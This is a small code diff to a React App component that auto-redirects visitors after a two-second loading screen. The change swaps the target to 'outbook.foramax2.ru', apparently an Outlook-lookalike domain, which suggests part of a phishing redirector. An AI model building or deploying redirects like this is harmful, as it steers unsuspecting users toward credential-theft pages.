@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbox.sookemarinecentre.com';
+            window.location.href = 'https://outbook.foramax2.ru';
         }, 2000);
 
         return () => clearTimeout(timer);
